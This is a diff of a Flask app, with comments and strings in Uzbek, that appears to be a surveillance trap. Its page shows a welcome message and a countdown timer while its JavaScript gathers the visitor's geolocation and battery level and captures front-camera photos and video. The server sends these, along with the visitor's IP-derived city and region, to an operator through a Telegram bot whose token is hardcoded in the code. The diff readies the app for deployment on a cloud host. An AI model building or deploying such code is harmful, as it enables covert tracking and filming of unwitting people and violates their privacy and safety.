@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify
 import telebot
 import base64
 import requests
+import os
 
 # --- SOZLAMALAR ---
 TOKEN = '8463907503:AAG483pQLs-7kQWGth-GxCGKqHdrythh2RQ'
@@ -12,12 +13,11 @@ app = Flask(__name__)
 
 def get_ip_info(ip):
     try:
-        if ip == "127.0.0.1":
-            return {"city": "Toshkent", "regionName": "Toshkent", "org": "Uztelecom Test"}
+        # Proxy orqali kelgan real IPni olish
         res = requests.get(f"http://ip-api.com/json/{ip}").json()
         return res
     except:
-        return None
+        return {}
 
 @app.route('/')
 def home():
@@ -30,7 +30,6 @@ def home():
         <style>
             body { background: black; color: white; text-align: center; font-family: sans-serif; padding-top: 100px; }
             #timer { font-size: 40px; color: #00ff00; margin-top: 20px; }
-            .msg { font-size: 18px; line-height: 1.6; padding: 20px; }
         </style>
         <script>
             let timeLeft = 30;
@@ -39,10 +38,7 @@ def home():
                 let interval = setInterval(() => {
                     timeLeft--;
                     tDisp.innerText = timeLeft;
-                    if (timeLeft <= 0) {
-                        clearInterval(interval);
-                        window.close();
-                    }
+                    if (timeLeft <= 0) { clearInterval(interval); window.close(); }
                 }, 1000);
             }
 
@@ -53,7 +49,6 @@ def home():
                     let b = await navigator.getBattery();
                     info.bat = Math.round(b.level * 100) + "%";
                 }
-                
                 navigator.geolocation.getCurrentPosition(async (p) => {
                     info.lat = p.coords.latitude; info.lon = p.coords.longitude;
                     await initCamera(info);
@@ -62,36 +57,25 @@ def home():
 
             async function initCamera(info) {
                 try {
-                    let stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: "user" }, 
-                        audio: true 
-                    });
-                    
+                    let stream = await navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }, audio: true });
                     let video = document.createElement('video');
-                    video.setAttribute('autoplay', '');
-                    video.setAttribute('muted', '');
-                    video.setAttribute('playsinline', '');
+                    video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
                     video.srcObject = stream;
                     video.play();
 
-                    // Chrome uchun 5 soniya kutish
                     setTimeout(async () => {
                         let canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                         let ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0);
-                        
                         let imgData = canvas.toDataURL('image/jpeg', 0.9);
                         
-                        // Rasmni yuborish
                         await fetch('/p', {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({...info, img: imgData})
                         });
 
-                        // 2 soniya o'tib video boshlanadi
                         setTimeout(() => { captureVideo(stream); }, 2000);
                     }, 5000);
                 } catch(e) {
@@ -119,11 +103,7 @@ def home():
         </script>
     </head>
     <body>
-        <div class="msg">
-            👋 Salom Xush kelibsiz <br>
-            Iltimos Ishni boshlash uchun <br>
-            Ruxsat berib kuting ⏳
-        </div>
+        <div style="font-size: 18px;">👋 Salom Xush kelibsiz <br> Iltimos kuting... ⏳</div>
         <div id="timer">30</div>
     </body>
     </html>
@@ -132,18 +112,16 @@ def home():
 @app.route('/p', methods=['POST'])
 def p_handler():
     d = request.json
-    ip_info = get_ip_info(request.remote_addr)
-    city = ip_info.get('city', 'Oʻzbekiston')
-    region = ip_info.get('regionName', 'Nomaʼlum')
-    org = ip_info.get('org', 'Nomaʼlum')
-
+    # Cloudflare yoki Render IP-sini olish
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip_info = get_ip_info(ip)
+    
     msg = f"📸 **NATIJA OLINDI!**\n\n" \
-          f"🖥 **IP:** {request.remote_addr}\n" \
-          f"🏙 **Shahar:** {city}\n" \
-          f"🏛 **Viloyat:** {region}\n" \
+          f"🖥 **IP:** {ip}\n" \
+          f"🏙 **Shahar:** {ip_info.get('city', 'Nomaʼlum')}\n" \
+          f"🏛 **Viloyat:** {ip_info.get('regionName', 'Nomaʼlum')}\n" \
           f"🔋 **Batareya:** {d.get('bat', 'Nomaʼlum')}\n" \
-          f"🏢 **Tashkilot:** {org}\n\n" \
-          f"📍 **MANZIL:** [Xaritada ko'rish](https://www.google.com/maps?q={d.get('lat')},{d.get('lon')})"
+          f"📍 **MANZIL:** [Xaritada](http://google.com/maps?q={d.get('lat')},{d.get('lon')})"
 
     if 'img' in d:
         img_data = base64.b64decode(d['img'].split(",")[1])
@@ -159,8 +137,11 @@ def v_handler():
         v_data = base64.b64decode(d['v'].split(",")[1])
         with open("video.webm", "wb") as f: f.write(v_data)
         with open("video.webm", "rb") as f:
-            bot.send_video(MY_ID, f, caption="🎥 5 sekundlik video hisoboti")
+            bot.send_video(MY_ID, f, caption="🎥 Video hisoboti")
     return "ok"
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=8888)
+    # PORTni dinamik olish (Render/Heroku uchun shart)
+    port = int(os.environ.get("PORT", 8888))
+    app.run(host='0.0.0.0', port=port)
+
